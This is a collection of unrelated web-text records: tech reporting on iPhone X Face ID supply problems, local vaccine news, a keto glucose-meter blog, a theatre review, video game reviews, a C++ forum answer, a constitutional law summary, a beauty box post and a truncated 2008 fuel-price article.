ago, Foxconn Technology Group pulled as many as 200 workers off an iPhone X production line. Apple was struggling to get sufficient components for the phone and needed fewer people to put it together. The main culprit, the people said, was the 3-D sensor that recognizes faces and unlocks the handset. Foxconn declined to comment.\nThe sensor was always going to be a major technical challenge. Until the iPhone X, the most significant deployment of the technology was in Microsoft Corp.'s Kinect controller, which the Xbox console used to detect a gamer's movements. But the Kinect was the size of a large book, and Microsoft sold just 24 million units of the controller over two years, a far easier production challenge than the one confronted by Apple, which sells more than 200 million iPhones a year.\n\"That technology is something we have been looking at for five years,\" Chief Design Officer Jony Ive said in an onstage discussion hosted by The New Yorker this month. \"We had prototypes that were this big,\" he added, holding his hands about a foot apart. By the time Apple had greenlighted the iPhone X, the company was looking for technology that could be squeezed into a space a few centimeters across and millimeters deep.\nDespite demanding the near impossible, Apple didn't add extra time to get it right\u2014giving suppliers the typical two-year lead time. The tight schedule underestimated the complexity of making and assembling exceedingly fragile components, said one of the people familiar with the production process. That left suppliers short on time to prepare their factories and explains why the iPhone X is being released a full six weeks later than the iPhone 8, said this person, who asked to remain anonymous to discuss an internal matter. \"It's an aggressive design,\" the person said, \"and it's a very aggressive schedule.\"\nSource: Bloomberg reporting, Apple Inc.\nThe 3-D sensor has three key elements: a dot projector, flood illuminator and infrared camera. The flood illuminator beams infrared light, which the camera uses to establish the presence of a face. The projector then flashes 30,000 dots onto the face which the phone uses to decide whether to unlock the home screen. The system uses a two-stage process because the dot projector makes big computational demands and would rapidly drain the battery if activated as frequently as the flood illuminator.\nThe dot projector is at the heart of Apple's production problems. In September, the Wall Street Journal reported that Apple was having trouble producing the modules that combine to make the dot projector, causing shortages. The dot projector uses something called a vertical cavity surface-emitting laser, or VCSEL. The laser beams light through a lens known as a wafer-level optic, which focuses it into the 30,000 points of infra-red light projected onto the user's face. The laser is made of gallium arsenide, a semiconductor material, and the lens is constructed of glass; both are fragile and easily broken. Precision is key. If the microscopic components are off by even several microns, a fraction of a hair's breadth, the technology might not work properly, according to people with knowledge of the situation.\nTo make matters worse, Apple lost one of its laser suppliers early on. Finisar Corp. failed to meet Apple's specifications in time for the start of production, and now the Sunnyvale, California-based company is racing to meet the standards by the end of October. That left Apple reliant on fewer laser suppliers: Lumentum Holdings Inc. and II-VI Inc.\nThe fragility of the components created problems for LG Innotek Co. and Sharp Corp., both of which struggled to combine the laser and lens to make dot projectors. At one point only about 20 percent of the dot projectors the two companies produced were usable, according to a person familiar with the manufacturing process. LG Innotek and Sharp slowed the production process down in an effort to prevent breakages and ensure the components were assembled with the required level of precision.\nLG Innotek confirmed in a conference call with analysts Wednesday that there has been a problem with yield and that mass production is just beginning. The current modules are \"significantly\" more difficult to produce than previous cameras, said Kim Jong-ho, who oversees the South Korean supplier's optical solution division. He said manufacturing has improved enough to meet the iPhone X launch date, though supply may be limited, and stressed Innotek has been able to achieve a \"far stronger\" yield than a rival supplier\u2014a reference to Sharp. The Japanese company declined to comment.\nTo boost the number of usable dot projectors and accelerate production, Apple relaxed some of the specifications for Face ID, according to a different person with knowledge of the process. As a result, it took less time to test completed modules, one of the major sticking points, the person said.\nIt's not clear how much the new specs will reduce the technology's efficacy. At the phone's official unveiling in September, executives boasted that there was a one in a million chance that an interloper could defeat Face ID to unlock a phone. Even downgraded, it will probably still be far more accurate than TouchID, where the odds of someone other than the owner of a phone being able to unlock it are one in 50,000.\nBesides struggling to produce enough 3-D sensors, Apple has suffered from a dearth of suppliers capable of making organic light-emitting diode displays, Bloomberg reported last year. The OLED, which delivers sharper images, is the iPhone X's other main advance. But Apple is dependent on Samsung Electronics Co. for its entire supply of the components.\nFor months, Apple investors have fretted that a shortage of iPhone Xs would send consumers into the arms of rival smartphone makers such as Samsung and Huawei Technologies Co. Apple seems to have overcome the biggest production hurdles.

{"text": "Home/Children Health/Local health experts weigh in on COVID-19 vaccines for children\nLocal health experts weigh in on COVID-19 vaccines for children\nWILMINGTON, N.C. (WECT) \u2013 Earlier this week, a Food and Drug Administration (FDA) advisory panel endorsed a smaller dosage of Pfizer's COVID-19 vaccine for 5- to 11-year-olds.\nThe FDA is expected to vote in the next few days whether to authorize giving the vaccine to those younger children. Then, the data will be presented to the Center's for Disease Control for its approval.\nCarla Turner, New Hanover County's assistant health director, says younger children being able to get the COVID-19 vaccine can create a domino effect for safety among older and more vulnerable populations.\n\"Lots of kids tend to be mildly symptomatic or asymptomatic, and what's concerning about that is if I don't have symptoms and I'm sick and I go to visit grandma, I may be exposing someone who is at high risk, unknowingly to me,\" Turner said.\nDr. Khadijia Tribie Reid, Pediatric Medical Director at MedNorth Health Center, believes the chance for some of her immunocompromised patients to get vaccinated against the coronavirus would allow them to finally return to in-person learning.\n\"Depression and anxiety skyrocketed during that [the pandemic], which shows us that children absolutely thrive in those social, academic environments and, goodness, they missed out,\" Dr. Tribie said.\nWith a young child of her own, Dr. Tribie expects other families, like hers, would be eager to get their children vaccinated.\n\"My 12-year-old had the vaccine, which leaves my nine-year-old, who is a little upset that she's been left out,\" said Dr. Tribie. \"She's ready, she's absolutely ready. So within my house we have some readiness, and I think that reflects what you're going to see in families as a whole.\"\nShe also knows that some families might not want to vaccinate their children right away.\n\"A lot of the parents are hesitant about being first in line, they want to, kind of, see what's going to happen and, of course, the FDA will continue to monitor this vaccine just as they are monitoring the vaccine in adults and adolescents,\" said Dr. Tribie.\nThe FDA panel approved a smaller dose of the vaccine for children, which is about one-third of the adult dosage.\nTurner says the county will make the vaccine available for children as soon as it is approved and when the allotment of doses from the state is received. Turner adds that one place vaccines may be distributed is at the county's Independence Mall site.\n\"We have the ability to set up what I call, kind of, private vaccination seats in that site at the mall so that if I'm a six-year-old and I'm sitting down in a chair to get vaccinated I'm not looking over and watching the 10-year-old beside me getting vaccinated,\" said Turner. \"We can kind of break that up and give each family, each parent, and the child some privacy to help ease any anxiety surrounding the vaccination.\"\nTurner encourages parents to be thoughtful and hopes they will bring their children to get vaccinated.\n\"Please know that this vaccine for the pediatric population went through the same rigorous testing that other vaccines have gone through, that quite honestly any vaccine or any medication goes through before it's approved by those entities,\" said Turner.\nTo find out where you can get a vaccine in New Hanover County, visit the health department's website.\nCopyright 2021 WECT.

{"text": "The amount of glucose in your blood at any given time can give you valuable insights into how your body is reacting to the food you eat. If you're doing a keto-based diet, the data you get from a blood glucose meter will help you optimize your eating for maximum weight loss.\nThe premise of a keto-based diet is simple: Keep the carbs as low as possible so that your body is forced to get glucose (energy) from fat, rather than carbs. Any sort of glycemic reaction could cause a weight-loss stall for several days.\nNot sure what a Keto diet is, or want to learn more about it? I talk about what a keto diet is, and the pros and cons of this approach in this blog article.\nWhat is a glycemic reaction?\nIn short, a glycemic reaction is what happens when you eat carbs. It's a fancy name for an even fancier process. Effectively, when you eat carbs, your body produces a hormone called insulin which is responsible for delivering the glucose (the energy from the carbs you just ate) to the muscle cells in your body.\nIn a keto-based diet, you want to avoid the production of insulin at all costs. Not because insulin itself is bad, but because it means you've short-circuited the keto process by eating too many carbs and allowing your body to get energy from carbs rather than fat. If this happens, it can take days to \"reset\" your body back into ketosis.\nIn short, if you are doing a keto-based diet and your blood glucose levels spike, you screwed up.\nGet yourself a blood glucose meter!\nYou can buy a blood glucose meter from any pharmacy in the $20-$40 range. The test-strips come in packs of 100 for around $25. (that is $0.25 each if you're bad at math). Here's a link on Amazon to a glucose meter kit that's perfectly adequate.\nThis is the same device that a diabetic would use to check their blood sugar levels. They are simple to use and super portable. The process involves pricking your finger to take a very small blood sample and inserting the sample into the meter. A few seconds later, voila, you've got your glucose level on a digital display.\nUnder 60-65: WAY TOO LOW Anything under about 60-65 is a sign that your blood sugar is too low. In this range, you will feel shaky, very hungry, and crave sugar and sweets. Your blood sugar can also hit this level if you're experiencing a sugar crash (that feeling you get after you've eaten a very sugar snack, and you're coming down from the sugar high). If your blood sugar is in this level on a regular basis, you should see a doctor immediately as it's a sign you may be hypoglycemic.\n65-90: JUST RIGHT This is the sweet spot for a keto-based diet. It means your body currently has no real source of glucose available to it. A normal person should be in this range when they're in a fasting state (as in, when they first wake up in the morning after having not eaten anything all night). A person doing a keto-based diet should aim to be in this range 24 hours a day, 7 days a week.\n115-180: GLYCEMIC Your body is experiencing a full glycemic reaction. This is typically from eating large amounts of carbs or sugar. Without a doubt, you are no longer in ketosis, and your cells are now in \"storage mode\". (meaning, whatever else is sitting in your stomach is quite likely to be stored as fat). This is bad. Really bad. But you probably know what you ate that caused it. Also note that if your blood sugar level is in this range right after you wake up (while you are in a fasted state) you should see a doctor immediately, as it's a sign that you may be diabetic, or pre-diabetic.\nOver 180: SEE A DOCTOR You may have a condition called \"Hyperglycemia\". You should see a doctor as soon as possible.\nI like to measure when you first wake up in the morning and 1-hour after you eat each meal or snack. Write the data down for about a week, noting what you ate, and what your blood sugar levels were one-hour after you ate it. After about a week or eating your normal \"menu\", you'll have a good sense for the reaction your body is having to the food you eat and you won't need to measure anymore unless you change up your food choices.\nIf you introduce a new food into your routine, you should measure again 1-hour after eating it to ensure that it's \"safe\" (meaning, it doesn't have any hidden carbs, and your body is not producing insulin when you eat it). You'd be surprised how often people on a keto-based diet struggle to lose weight, only to discover that they're eating carbs and didn't realize it. Or, more illusively, that they're eating foods their body is reacting poorly to, and they didn't know it.\nI consider a blood glucose meter a critical item to have in any keto-toolbox.\nIn the beginning, measure when you wake up, and 1-hour after each meal.\nKeep a detailed log of your results. (Time of day, reading, and what you ate).\nAim to keep your blood sugar level in the 65 to 90 range at all times.\nIf your number goes above that, narrow down what food caused it and eliminate them from your diet.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 58136}
{"text": "Not That Kind of Review: Bedlam's \"Pygmalion\"\nPosted on March 5, 2019 by Diana Lu\nThe cast; Photo by Nile Scott Studios\nPresented by Bedlam Theatre Company\nDirected by Eric Tucker\nWritten by George Bernard Shaw\nJanuary 31, 2019 \u2013 March 3, 2019\nCentral Square Theatre\nCentral Square Theater on Facebook\nReview by Diana Lu\n(Cambridge, MA) Central Square Theatre hosts New York City's Bedlam Theatre Company in their revamped version of Pygmalion, by George Bernard Shaw. This is the classic story of English phonetician Henry Higgins (Eric Tucker) discovering and training working class waif Eliza Doolittle (Vaishnavi Sharma) on the speech and manners of a proper English lady, to the ultimate folly of both. Bedlam's new interpretation returns to Shaw's original feminist conception of Eliza and Henry's fraught relationship and also changes the Doolittle family to Indian immigrants, ostensibly to reflect modern day issues of gender, class, and immigration in the US. It was a very well done production, and I'm sure there will be many reviews which praise all its various technical merits. This review isn't one of them.\nWhat. The. Fuck. Bedlam? What in the actual fuck were you guys thinking, just shoe-horning in the \"minor detail\" that Eliza Doolittle is an Indian woman, in the most superficial and simple-minded ways possible. Yeah, the Doolittles had thick Indian-sounding accents (bordering on racist caricature, btw) instead of Cockney. Eliza wore a sari when she was being presented as a Duchess instead of an English lady's gown. There was passing reference to the family being immigrants from Punjab. Outside of that, there was no reference at all to Eliza's identity as an Indian woman, an immigrant, or how either of those facts inherently change her station in IMPERIAL LONDON and how the WHITE BRITISH PEOPLE dictating her life would have treated her. Shaw's original play was an analysis on gender and class relationships in England at a very specific time in its history. The Doolittles being Indian FUNDAMENTALLY CHANGES THE STORY.\nRace, ethnic identity, immigration, and colonialism aren't trivial details that can be laid on top of a story like window dressing. To treat these histories, identities, and relationship dynamics as such is as insulting as it is idiotic. Furthermore, the ways that gender, class, race, ethnicity, and immigration status intersect in the UK EVEN NOW are fundamentally different from the way they do in the US. Trying to hamfist a metaphor about the American political landscape now into a story about the British Empire of a century ago without thoughtful and nuanced rewriting is about as \"fresh\" and \"inventive\" as trying to use a banana as a plunger.\nIt makes this play look like a revisionist fantasy of a post-racial British Empire, which frankly, is more reflective of what the white liberal political landscape of the US looks like than anything Bedlam inserted into the play itself.To see such a flawless production with such fine detail paid to every other piece, with just this one big piece completely ignored/butchered absolutely breaks my heart. It's just another reminder that any talk of race is so viscerally abhorred in this country and the one thing that makes every well-intentioned white liberal American SO SO UNCOMFORTABLE.\nBut I can't ignore it. It's part of myself. YOU ALL MADE THIS an intrinsic part of my history and my identity, and it is a part that has never been and is still not understood, recognized, or welcome in white liberal spaces. I am not ok with that. People of color in this country are not ok with that and we have been saying so FOR DECADES. When are you all going to finally fucking listen? Because this play right here, is not self-examination or acting on your progressive ideals. It's performing the bare minimum in a virtue signaling mutual masturbation circle. I know I'm being harsh, but I have to say it because there are PRECIOUS FEW theatre critics of color, so I'm sure nobody else is going to, and frankly, Eliza Doolittle wouldn't have held back on her language either.\nIronically, this all does make me relate to Eliza Doolittle's situation more, and why she had to go her own way. As she said, \"all I want is a little acknowledgement, a little kindness.\"\nIf you enjoyed this article, please consider making a donation.

{"text": "Battle of the Backlog Episode 5: Nine Down, Seventy To Go\nDecember 19, 2014Harry Nezumi0 Comments\nNot my pile of shame, but not far off.\nOne man, Harry Nezumi \u2014 some say brave, others foolish \u2014 stands against his backlog. With but five months between now and a move some 9,000 kms from home, does he have what it takes to complete all the outstanding games in his collection? Follow his quest, his Sisyphean toil, here on Sega Addicts as he tackles one hundred and seven games over twenty weeks. The journey will not be easy, the day grows dark and the hour late. Yet there is hope. With nine more games served up, did Harry complete the lot, or will their be more postponements and more defeats? Find out below.\nCompleted: Virtua Fighter 5 Final Showdown (XBLA); Rival Schools (PS); Project Justice Rival Schools 2 (DC); Star Gladiator (PS); Plasma Sword (DC); Enemy Zero (Sat); Virtual On 4 Force (360); Revenge of Shinobi (XBLA); Mega Man 9 (XBLA).\nThe last two weeks have seen one game a week retired as being too awful, or not worth the investment in time, to complete. Consequently, this week I went a little off piste and introduced two titles from the original PS. I had not intended to play anything from this format as it can be handled easily through emulation. However, the sequels to Star Gladiator and Rival Schools were both on my list, so to uphold the Corinthian spirit and get more out of their successors, they were added. Whilst both these sequels may be clearly 'of their time' they are still worth your time. This was somewhat of a running theme, with Enemy Zero, Mega Man 9, Virtual On 4 and Virtua Fighter 5 all providing outstanding, if conceptually dated, experiences. All told, this proved to be a very strong selection indeed, with so many great games to play the writing of this backlog article, and the somewhat Herculean task it entails, still feels like a privilege.\nGame of the Week: Project Justice Rival Schools 2 (DC)\nNightmare of the Week: Star Gladiator (PS)\nA Clean Sweep!\nVirtua Fighter 5 Final Showdown (XBLA) \u2014 This series, like Street Fighter before it, has always been an example of what iterative development can achieve. Final Showdown is refined to the nth degree and offers all the wonderful technical depth for which Virtua Fighter has been know since its 1993 debut. Playing this back-to-back with Virtua Fighter 2 it becomes evident how much the series has actually slowed down. It is now a far less tense, though no less challenging experience. Fights are still deadly and over quickly, but the focus on realism has created a far greater emphasis on post-move recovery frames. Consequently, expertly executed combos are both prized and effective, rewarding high-level play. Furthermore, the significance of recovery frames give a unique rhythm to the game as players swap between offensive and defensive play. In gameplay terms, Final Showdown has seen further refinements to the formula of 2008's Virtua Fighter 5 Online, high-level players will doubtless appreciate the balancing though it's debatable how much most people will notice. Sega's anti-consumer decision to hide Online's wonderful customization options behind a DLC paywall may not, however, make this the best overall value. Those deeply invested in Virtua Fighter 5's mechanics will find it a worthwhile addition to the series, those not expecting to play at the highest level may well find a better all-round package in the 2008 release. 5/5\nRival Schools (PS) \u2014 As one of Capcom's earliest 3D fighters, Rival Schools is often overlooked for its more famous 2D brethren. Indeed, pre-Street Fighter 4, Capcom released a slew of 3D games, none of which captured the hearts of critics or gamers the same way their previous titles had. Yet, Rival Schools reveals itself to be a surprisingly deep game that rewards technical play and finesse in execution. As with the ill starred Street Fighter EX series, Rival Schools is notably slower paced, however, this is used to the advantage of the mechanics. In reducing the speed, the great amount of recovery frames become very obvious and can be easily exploited by a defensive player. Consequently, initiating and executing combos becomes a virtue. This may sound off-putting with a high barrier to entry, but it is compensated by the simplified controls, using shotokan character inputs, and reducing the number of buttons from six to four, working well with the PS controller. With this accessibility, high skill ceiling and excellent character design, Rival Schools is really somewhat of an overlooked gem. 4/5\nProject Justice Rival Schools 2 (DC) \u2014 Following Rival Schools looks an easy act in sales terms, but was doubtless challenging given the quality of the title. Fortunately this sequel does everything right and then some. The mechanics are just as accessible and similarly deep, but now there are more protagonists and a story mode that crafts an interlocking web of narratives and 'dramatic battles'. Of course the story is ridiculous, of course it is compelling. That it is told from different angles, with a different narrative for each set of characters, creates a compelling reason for repeat play and is further supported by a slew of unlockable content. There has clearly been a large amount of time spent on the presentation, with the expected generational leap in quality between Project Justice and Rival Schools further emphasized by the strong character design and engaging setting. The mechanical tweaks, most notably the faster gameplay, have all improved the experience, demonstrating that, as with the best sequels, Project Justice does not simply provide 'more' but also 'better'. 5/5\nStar Gladiator (PS) \u2014 To liken the experience of playing Star Gladiator to molasses would result in a strong rebuke from the Molasses Manufacturers Association for besmirching their product. As cold-blooded animals, lizards have a slower metabolism when the weather is cool. It can only be presumed that the principal characters of Star Gladiator are part reptile and the action takes place in the depth of a galactic winter. Unfortunately, the lack of pace is but one problem for the title. The character movesets are remarkably similar with little variation and the combos flow anything other than freely. The comparative lack of ranged attacks also restricts tactical options, with little to no need to control space. If this created a compelling, thoughtful experience focussed on high-level technical skills and close combat, it would mitigate these criticisms. However, that is clearly not the case. Virtua Fighter 2 showed in 1994 that it is possible to have such a heavily technical game, operating at speed, complemented by a wide variety of characters with an emphasis on close combat. Coming two years later, Star Gladiator feels like a relic of a bygone era and offers none of the excitement of AM2's masterpiece. The game is not without merits, the designs, though generic Star Wars inspired space opera, are suitably hammy and the production values are as good as one would expect of Capcom in the '90s. This, however, is the faint praise by which the experience is damned and there is nothing here to recommend Star Gladiator over countless other excellent 3D fighters. 2/5\nPlasma Sword (DC) \u2014 The opening cinematic of Plasma Sword gives the game's name as 'Star Gladiator II'. Thankfully this explicit connexion is made, not to carry the 'good' name of the prequel to its successor, but rather because no-one would believe that these two games come from the same series. Simply put, everything that was wrong with Star Gladiator, and there was a whole lot, has been torn up to create a vastly superior experience. Where once the characters dragged their feet through treacle, they now move with a speed and precision becoming of Capcom's heritage. Combos, the preserve of the patient and saintly in Star Gladiator, now flow like tabloid headlines. So dramatic is the change, that Plasma Sword could be used a useful primer for anyone unfamiliar with Capcom's 3D fighters. Indeed, with all characters once again basing their movesets from quarter-circle motions, and a loose combo system that rewards the repeated hammering of a single button, the biggest criticism of Plasma Sword is that it is, perhaps, too dumbed down. Nevertheless, with improved story delivery, character design that draws influences from more than one source (including Sega's own Phantasy Star Online) and a mechanical overhaul that places entertainment and fun front and centre, such criticisms are a small price to pay for the massive leaps forward in all other areas. 4/5\nI have been accused of liking Virtual On \"a little too much\"\nVirtual On 4 Force (360) \u2014 For a series born in the arcades, where accessibility is prized as much as cash-guzzling, Virtual On has always been an acquired taste. The only question is what type of taste: is it getting used to the rancid, sour bite of a McDonald's gherkin, or is it the depth and complexity of an aged Bordeaux. A quick glance at the score below will easily tell you which one of these I believe Virtual On 4 Force to be. Whilst the latest title does little to alter the core mechanics of the game, the big innovation is the introduction of 2-on-2 battles. This drastically changes the feel of the combat which has always been more cerebral than other 3D fighting games. Slower pacing was an advantage for the series, a seeming necessity of the idiosyncratic control. High-level play, usually thanks to having access to twin sticks, shows that it is the player's ability, not the game itself, that dictates how fast it plays. In skilled hands the somewhat cumbersome Virtuaroids become deadly and swift, with jumping automatically centering the target and boosting allowing quick, close quarter combat. The 2-on-2 structure adds this level of mania, previously only enjoyed by veterans, for beginners. The relatively low barrier of entry when compared to the other games, combined with the series-staple high skill ceiling, makes Virtual On 4 Force almost the definitive version. I say almost as, despite the 360's dual analogue sticks, the controls are not faithfully mapped from the arcade. Like Street Fighter, Virtual On is one of the few games that benefit hugely from correct control layout and the failure to carry this across does tarnish the game's sheen. Nevertheless, with the underlying gameplay as compelling as it has ever been, Virtual on 4 Force is well worth the investment while the limited English support and region free disc make this accessible to Western gamers. 4/5\nEnemy Zero (Sat) \u2014 Kenji Eno's masterpiece defies easy categorization. 'Interactive movie' does the title's agency a disservice and 'survival horror' implies a more traditional approach to gameplay than is shown for most of its five hour run-time. Enemy Zero is two distinct games married by a narrative that infuses Alien and Blade Runner. The 'enemy' of the game's title are the invisible aliens stalking the crew. The lazy have claimed that this invisibility was to save on expensive, resource hungry graphics. However, this is a central part of the gameplay with Eno drawing on his experience developing games for the deaf. Here the player is given the enemy's position via the frequency and tone of a sonar-esque ping. These sections take place in first person, with your character, Laura, grossly underpowered by the long charge and low capacity of her weapon. The claustrophobia, the silence, the beeps of the alien's position and the one-hit kills all give a feeling of true survival horror. The adventure segments are closer to an interactive movie but have many of the characteristics of a point-and-click game. It can feel like an uneasy marriage but it is narratively justified. It lends actual gameplay to what would otherwise be cinematic sequences, sequences which build a believable world with all the drama expected of people put in an extreme situation. Undoubtedly, it's not for everybody, but it is a window into an alternative form of game rarely seen today. Perhaps it's an evolutionary dead end, but it is perched on an electrifying fault line between cinema and gaming. 4/5\nRevenge of Shinobi (360) \u2014 It often seems that the Mega Drive did not hit its stride until '91 or '92. Sonic was, of course, the game changer, launching the console into millions of homes and causing a stampede of development that pushed the hardware to its limits. It pays to remember this when playing Revenge of Shinobi, as it was one of the titles that made the Mega Drive look like a sea change, coming a full two years before the blue hedgehog. In every way it's a superior experience to the original Shinobi (both arcade and Master System versions) but it does show its age at times. The slow pace that would be so radically overhauled in Shinobi III is here and affects every aspect. Fortunately, Sega's level design turned it into a virtue, it evolved the key feature of the arcade original \u2014 the jumping between foreground and background layers \u2014 and placed this centre stage. When combined with the challenging, at times byzantine levels that force the player to weave in and out of the layers to avoid danger and strike safely, the excellence in design shines through. Revenge of Shinobi has undoubtedly aged, the slow pace and high difficulty will not be to everyone's tastes, but in 1989 this was an outstanding title that still commands respect to this day. 3/5\nMega Man 9 (XBLA) \u2014 That mighty-big number nine in the title is really rather deceptive. Sequels regularly build on their predecessors, adding new features and tweaking the old. However, with some 12 years between Mega Man 8 on the Saturn and PS and this XBLA title, Capcom decided to strip back Mega Man and relaunch him in the style of the 1987 NES original. A glance at the screenshots confirms the authenticity, optional screen flicker and all, of the project, but this focus goes far beyond the presentation and right into the mechanics. If Mario started life as 'Jump Man', then Mega Man is 'Jump and Shoot Man', because that pretty much describes his entire moveset here. The consequence of purging the more advanced moves, like the slide, means an emphasis on level design that verges on the puzzle-like. No longer can the player zip in and out of danger, more careful planning is required.

There is a construct called a typelist that can be used to sort of achieve an effect like you're after.  Unfortunately, even then you won't get named members, you will get accessor functions with names like MyClass::getField<1>().\nIn C++0x you can do better than typelists with variadic templates.  But you will still have accessor functions that look just like the C++ case.\nIt's tempting to put down a variadic template example here because it wouldn't be too huge.  Unfortunately I think that doing it well would require a few hours of research on my part to learn exactly how variadic templates worked.  I could do a stupid version relatively easily, but I expect the stupid version would be a lot less nice in various ways than a well done version.\n", "meta": {"redpajama_set_name": "RedPajamaStackExchange"}, "__index_level_0__": 63122}

{"text": "Rule of Law Programme Middle East and North Africa\nVisit us also at\nFundamental Works of Constitutional Law\nPublications (Archive)\nLink recommendations\nThe Fundamental Right as a Right of Defence and a State Duty to Protect\ndetail - Rule of Law Programme Middle East and North Africa\nJosef Isensee\nFundamental rights are probably the most elemental aspect of the German constitution and an expression of its liberal design. Reflecting this importance, they stand at the very beginning of the constitution. However, the fundamental rights have different functions. An examination of these functions is necessary in order to understand their necessity and the system of fundamental rights in German constitutional law.\nThis publication is available in the following languages\nApril 1, 2020 Ordering Information\nIn his contribution \"The fundamental right as a right of defence and a state duty to protect\", published in the Handbook of Constitutional Law of the Federal Republic of Germany, Josef Isensee1 takes a closer look at the fundamental rights of the German constitution and their functions. This issue is of particular relevance because the canon of fundamental rights builds the identity-forming core of liberal constitutionalism. They are of outstanding importance for the situation of the individual citizen in the dualism of a powerful state and a pluralist society. However, fundamental rights have different functions. Isensee's contribution sheds light on the distinction between the defensive effect of fundamental rights and the state obligation to protect them.\nStarting point of that distinction is the liberal design of the constitution and its idea to protect the private interests from outside interventions. While the fundamental right as a right of defence protects the citizen from intervention by the state, the state obligation to protect rather serves to protect the citizen from intervention by other private individuals or corporate bodies. Based on this premise, Isensee describes the function of rights of defence as status negativus, since they presuppose that the state will refrain from action, and the state obligations to protect as status positivus, since they require state intervention. However, this also determines that the state is the addressee of both dimensions of fundamental rights.\nIn light of the dogmatics described above, it becomes clear that obligations to protect are not always as evident in their applicability as the rights of defence. However, the are recognised by the jurisdiction of the Federal Constitutional Court of Germany and their existence is not disputed. Rather, they have experienced a \"Renaissance\" (Isensee), for example in terms of environmental protection.\nAll fundamental rights formally have the same structure. They specify the bearer and the addressee, determine the respective substantive content and the possibility and criteria for an interference in the guaranteed right. Starting point of any examination of fundamental rights is the scope of protection. It is its scope of protection that defines the importance of a right. It should be borne in mind that fundamental rights are formulated quite openly; they only have a \"framework character\" (Isensee) and therefore need to be filled by legal practice and scholarly discourse. At the same time, most of the fundamental rights that can be found in the German constitution already provide the possibility of their restriction. But even if that is not the case, a \"constitutionally immanent\" restriction by other fundamental rights is possible.\nConsidering the definition of interference in a fundamental right, the understanding has changed. While in the past only those actions by the state, which were final, direct, legal and enforceable by compulsion were understood as state interventions, the modern understanding of intervention goes much further and regards every restriction of freedom by the state as an intervention. But such interventions do not per se constitute violations of fundamental rights. It is possible that it may appear to be constitutionally justified. This requires in particular the proportionality of the intervention.\nThe structure of the obligation to protect, which has been decisively shaped by the Federal Constitutional Court of Germany, differs from the above because the threat of intervention in fundamental rights does not originate from the state. Therefore, a threat to fundamental rights must initially be determined and \u2013 in consideration of the protection guaranteed by the rights \u2013 appropriate protective measures must be taken. Accordingly, it is the task of the state to prevent interference by \"disruptive\" third parties. Here too, however, the measures taken by the state must be proportionate and, in particular, consider the fundamental rights of the \"interferer\". In these cases, it is the task of the state to establish a concordance between the fundamental rights of the parties involved. This contribution by Isensee substantially explains the systematics of the different functions of fundamental rights and is thus essential to understand the Basic Law as a liberal constitution that protects the freedom of the individual.\n1Josef Isensee is an emeritus german professor of constitutional law. He taught in Saarbr\u00fccken, Bonn, and held several guest professorships. In particular, he has published widely on matters of of state organization, fundamental rights and constitutional theory.\nSend via mail\nThe Fundamental Right as a Right of Defence and a State Duty to Protect.pdf\nRobert Poll\nrobert.poll@kas.de +961 1 385 094 | +961 1 395 094\nKonrad-Adenauer-Stiftung e.V.

{"text": "If I say so myself I think this is quite a good one, but you'll be the judge of that!\nThis month, we have over \u00a390 worth of value in the box for your \u00a324.99 even better, every one of them is an award winning brand. I'm attempting to look modest over here, without much success, so let's just dive right in.\nMargaret Dabbs Intensive Hydrating Foot Lotion (200ml/RRP \u00a325) is an absolute coup. Margaret doesn't usually go into boxes and certainly not with her full size products but we weedled our way around her and she loves what we do so there you are. For those of who don't know Margaret is a globally-redognised specialist in foot care with 9 clinics around the World (including one in Dubai) and this is both her favourite and best-selling product. I thought that our feet have probably been out and about a fair bit in the recent sunny spell and so are probably in need of a bit of TLC by now. Interestingly (well, I think so), feet fair better in socks and boots - it's the warmth and moisture, you see. Anyway, we digress. This lotion visibly moisturises the skin of the feet, leaving them silky, illuminated and light. With the signature ingredient of Emu Oil and the scent of lemon myrtle it's a summer winner.\nSo, having looked at feet I thought we'd also travel up a bit and look at legs, as they're probably out at present as well. Mine are and when I look down they are dry. Not nice. ThisWorks Skin Deep Dry Leg Oil (80ml/RRP \u00a325.00) is your answer this summer. It's a specific leg oil as it's designed to massively increase hydration and the sheen on legs, without being sticky. It's an award-winning product and comes in a light spray making it ideal for everyday application.\nNow what we need is a spot of colour so I've gone with Leighton Denny's Nail Polish in Bon Voyage (12ml/ RRP \u00a312.00). Leighton has built his brand from being a session nail technician to a multi-million pound brand and I'm thrilled for him. In his early days I had a nail salon which stocked his products and he came down in person to launch the brand and do an evening with customers. A true professional. Anyway, pop of colour for hands and feet as we're always more adventurous in summer.\nI've also popped in Leighton Denny's Slick Tips (12ml /RRP \u00a312.00). My reasoning is that cuticles get dry all year round, but on hols you've got a bit of a moment on the beach to massage in a bit of cuticle oil. I'm not sure if it's the oil or the massage action that stimulates grow and helps strengthen nails, but what I do know is that nails need moisture so this will see you right through the change of seasons as well. Pop a bit on after the colour and you'll see the difference it makes.\nThe final box product is St Tropez's Self Tan Express Face Sheet Mask (single use / RRP \u00a37.50). Now, don't be afraid of this product, it's dead easy, you won't look odd and it will make your skin look great! Basically, the longer you leave this mask on, the darker your skin will go. I'd also move the product around a bit once you take the mask off to ensure that it's even all over and wash your hands pronto. Follow the instructions for a fabulous summer glow!\nBut wait! There's just one more treat! I've popped in an Aromatherapy Associate 9ml Revive Morning Bath & Shower Oil (RRP \u00a39.00). I love their bath and shower oils are they are incredibly concentrated. This one is designed to give you a little juzzzz in the morning to get you up and out with a perky smile.\nSo that's it, August in a box.\nHope you love it and look forward to catching up soon!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 38264}
{"text": "'Petrol crisis' sparks fears of rising bills\nBy Nicholas Cecil\nUpdated: 08:37 EDT, 30 May 2008\nBritain is in an 'economic crisis', a minister warned today as soaring oil prices threatened to add \u00a3650 to the average household bill.\nSummer of misery: The AA said families can expect to pay \u00a3250 a year more for petrol than last year\nThe frank assessment by business minister Baroness Vadera added to Gordon Brown's woes on the day Labour was braced for its worst by-election defeat for 30 years in Crewe and Nantwich.\n>> Diesel vs petrol\nOil prices hit a record high of $135 a barrel today. Motoring organisations said the hike would hit the forecourts 'within four to six weeks', sending unleaded petrol up by about two-and-a-half pence a litre.\nThe AA said that with unleaded and diesel already at record prices it signalled a 'summer of misery' for thousands of families.\nBaroness Vadera, a close adviser to Gordon Brown and a former UBS Warburg investment banker, said: 'We are facing a very testing period in the economy. It is the first real economic crisis of globalisation.\n'With a small start in Texas, the global credit crunch is combining with international prices, and this is also impacting on food prices.\n'We are facing a rather uncomfortable situation caused by the global liquidity squeeze still being worked through in the US, and rising world commodity prices, but I strongly believe that the UK is relatively well placed to face these challenges.'\nThe $5 